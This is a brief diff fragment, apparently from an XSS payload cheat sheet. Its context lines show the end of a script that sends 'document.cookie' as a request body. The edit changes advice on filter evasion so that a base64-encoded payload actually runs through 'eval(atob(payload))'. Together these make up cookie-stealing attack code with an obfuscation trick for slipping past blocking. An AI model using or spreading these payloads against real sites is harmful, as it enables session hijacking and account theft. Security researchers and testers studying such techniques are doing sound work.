@@ -93,7 +93,7 @@ body:document.cookie
 });
 </script>
 
-If it is blocked, you may need to encode with base64. you can use atob(payload) as your final payload.
+If it is blocked, you may need to encode with base64. you can use eval(atob(payload)) as your final payload.
 
 
 
